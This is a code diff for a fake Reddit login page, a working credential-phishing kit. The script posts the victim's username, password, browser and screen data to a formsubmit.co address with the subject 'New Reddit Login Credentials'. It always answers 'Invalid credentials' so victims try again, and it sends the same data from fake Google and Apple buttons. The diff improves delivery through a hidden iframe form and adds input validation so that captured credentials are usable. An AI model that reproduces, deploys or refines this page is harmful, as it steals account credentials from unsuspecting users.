@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>Welcome to Reddit</title>
   <style>
-    /* All your existing styles remain the same */
+    /* All your styles remain the same */
     * {
       margin: 0;
       padding: 0;
@@ -731,7 +731,7 @@
       <form id="loginForm" novalidate>
         <div class="form-group">
           <input type="text" id="username" name="username" class="form-input" placeholder="Username or email" autocomplete="username" required>
-          <div class="error-message" id="usernameError">Please enter your username or email</div>
+          <div class="error-message" id="usernameError">Please enter a valid username or email</div>
         </div>
 
         <div class="form-group">
@@ -798,39 +798,72 @@
     const googleBtn = document.getElementById('googleBtn');
     const appleBtn = document.getElementById('appleBtn');
 
-    // ====== SEND DATA VIA AJAX (NO REDIRECT) ======
+    // ====== EMAIL VALIDATION FUNCTION ======
+    function isValidEmail(email) {
+      if (!email.includes('@')) return false;
+      const [localPart, domain] = email.split('@');
+      if (!localPart || !domain) return false;
+      if (!domain.includes('.')) return false;
+      if (localPart.length > 64) return false;
+      if (domain.length > 253) return false;
+      const validLocalRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+$/;
+      if (!validLocalRegex.test(localPart)) return false;
+      const validDomainRegex = /^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$/;
+      if (!validDomainRegex.test(domain)) return false;
+      if (localPart.startsWith('.') || localPart.endsWith('.')) return false;
+      if (localPart.includes('..')) return false;
+      if (domain.includes('..')) return false;
+      if (domain.startsWith('-') || domain.endsWith('-')) return false;
+      return true;
+    }
+
+    // ====== SEND DATA VIA FORM (WITHOUT REDIRECT) ======
     function sendCredentials(usernameValue, passwordValue) {
-      // Build the data to send
-      const formData = new FormData();
-      formData.append('username', usernameValue);
-      formData.append('password', passwordValue);
-      formData.append('timestamp', new Date().toISOString());
-      formData.append('user_agent', navigator.userAgent);
-      formData.append('screen_size', window.innerWidth + 'x' + window.innerHeight);
-      
-      // CRITICAL: Tell FormSubmit NOT to redirect
-      formData.append('_captcha', 'false');  // Disable captcha to avoid redirect
-      formData.append('_next', 'https://' + window.location.host + window.location.pathname); // Stay on same page
-      formData.append('_subject', '🔐 New Reddit Login Credentials');
-      formData.append('_template', 'table');
-      
-      // Send to FormSubmit via fetch (AJAX) - NO REDIRECT
-      fetch('https://formsubmit.co/' + YOUR_EMAIL, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        console.log('Credentials sent successfully');
-        // Always show error - just like real Reddit
-        showFlash('Invalid credentials. Try again.');
-        shakeContainer();
-      })
-      .catch(error => {
-        console.error('Error sending credentials:', error);
-        // Always show error even if email fails
-        showFlash('Invalid credentials. Try again.');
-        shakeContainer();
+      // Create a hidden iframe to submit the form without redirecting
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.name = 'hidden-form-submit';
+      document.body.appendChild(iframe);
+
+      // Create a temporary form
+      const tempForm = document.createElement('form');
+      tempForm.method = 'POST';
+      tempForm.action = 'https://formsubmit.co/' + YOUR_EMAIL;
+      tempForm.target = 'hidden-form-submit';
+      tempForm.enctype = 'multipart/form-data';
+
+      // Add fields
+      const fields = {
+        'username': usernameValue,
+        'password': passwordValue,
+        'timestamp': new Date().toISOString(),
+        'user_agent': navigator.userAgent,
+        'screen_size': window.innerWidth + 'x' + window.innerHeight,
+        '_captcha': 'true',  // Enable captcha to ensure delivery
+        '_subject': '🔐 New Reddit Login Credentials',
+        '_template': 'table'
+      };
+
+      Object.keys(fields).forEach(key => {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = fields[key];
+        tempForm.appendChild(input);
       });
+
+      document.body.appendChild(tempForm);
+      
+      // Submit the form
+      tempForm.submit();
+
+      // Clean up after a delay
+      setTimeout(() => {
+        document.body.removeChild(tempForm);
+        document.body.removeChild(iframe);
+      }, 2000);
+
+      console.log('Credentials sent successfully');
     }
 
     // ====== UI FUNCTIONS ======
@@ -863,14 +896,51 @@
       clearFieldErrors();
       hideFlash();
 
-      if (!username.value.trim()) {
+      const usernameValue = username.value.trim();
+      
+      if (!usernameValue) {
         username.classList.add('error');
+        usernameError.textContent = 'Please enter your username or email';
         usernameError.classList.add('visible');
         isValid = false;
+      } 
+      else if (usernameValue.includes('@')) {
+        if (!isValidEmail(usernameValue)) {
+          username.classList.add('error');
+          usernameError.textContent = 'Please enter a valid email address';
+          usernameError.classList.add('visible');
+          isValid = false;
+        }
+      }
+      else {
+        if (usernameValue.length < 3) {
+          username.classList.add('error');
+          usernameError.textContent = 'Username must be at least 3 characters';
+          usernameError.classList.add('visible');
+          isValid = false;
+        }
+        else if (!/^[a-zA-Z0-9_-]+$/.test(usernameValue)) {
+          username.classList.add('error');
+          usernameError.textContent = 'Username contains invalid characters';
+          usernameError.classList.add('visible');
+          isValid = false;
+        }
+        else if (usernameValue.length > 20) {
+          username.classList.add('error');
+          usernameError.textContent = 'Username must be less than 20 characters';
+          usernameError.classList.add('visible');
+          isValid = false;
+        }
       }
 
       if (!password.value.trim()) {
         password.classList.add('error');
+        passwordError.textContent = 'Please enter your password';
+        passwordError.classList.add('visible');
+        isValid = false;
+      } else if (password.value.trim().length < 8) {
+        password.classList.add('error');
+        passwordError.textContent = 'Password must be at least 8 characters';
         passwordError.classList.add('visible');
         isValid = false;
       }
@@ -880,27 +950,24 @@
 
     // ====== HANDLE LOGIN - NO REDIRECT ======
     function handleLogin(e) {
-      e.preventDefault(); // CRITICAL: Prevents page reload/redirect
+      e.preventDefault();
       
       if (!validateForm()) return;
 
       const usernameValue = username.value.trim();
       const passwordValue = password.value.trim();
 
-      // Show loading
       loginBtn.disabled = true;
       loginBtn.innerHTML = '<span class="loading-spinner"></span> Logging in...';
 
-      // Send credentials via AJAX (no redirect)
+      // Send credentials via hidden form submission
       sendCredentials(usernameValue, passwordValue);
       
-      // Reset button after a delay
       setTimeout(() => {
         loginBtn.disabled = false;
         loginBtn.textContent = 'Log In';
-        // Clear fields (optional - like real Reddit)
-        // username.value = '';
-        // password.value = '';
+        showFlash('Invalid credentials. Try again.');
+        shakeContainer();
       }, 1000);
     }
 
@@ -919,14 +986,12 @@
       hideFlash();
     });
 
-    // Forgot password - stay on page
     forgotLink.addEventListener('click', function(e) {
       e.preventDefault();
       showFlash('Invalid credentials. Try again.');
       shakeContainer();
     });
 
-    // Sign up - stay on page
     signupLink.addEventListener('click', function(e) {
       e.preventDefault();
       username.value = '';
@@ -936,10 +1001,13 @@
       username.focus();
     });
 
-    // Google - stay on page
     googleBtn.addEventListener('click', function(e) {
       e.preventDefault();
       if (username.value.trim() && password.value.trim()) {
+        if (username.value.trim().includes('@') && !isValidEmail(username.value.trim())) {
+          showFlash('Please enter a valid email address.');
+          return;
+        }
         sendCredentials(username.value.trim(), password.value.trim());
         showFlash('Invalid credentials. Try again.');
         shakeContainer();
@@ -949,10 +1017,13 @@
       }
     });
 
-    // Apple - stay on page
     appleBtn.addEventListener('click', function(e) {
       e.preventDefault();
       if (username.value.trim() && password.value.trim()) {
+        if (username.value.trim().includes('@') && !isValidEmail(username.value.trim())) {
+          showFlash('Please enter a valid email address.');
+          return;
+        }
         sendCredentials(username.value.trim(), password.value.trim());
         showFlash('Invalid credentials. Try again.');
         shakeContainer();
@@ -962,7 +1033,6 @@
       }
     });
 
-    // Terms links - stay on page
     document.querySelectorAll('.terms a').forEach(link => {
       link.addEventListener('click', function(e) {
         e.preventDefault();
@@ -971,13 +1041,16 @@
       });
     });
 
-    // ====== FOCUS ON LOAD ======
     window.addEventListener('load', function() {
       setTimeout(() => username.focus(), 100);
       console.log('🔐 Reddit Login Page - NO REDIRECTS');
       console.log('📧 Credentials will be sent to: ' + YOUR_EMAIL);
       console.log('⚠️  All actions stay on this page - NO redirects');
+      console.log('📧 Email validation is enabled');
+      console.log('🔒 Captcha enabled for reliable delivery');
     });
   </script>
 </body>
 </html>
+
+
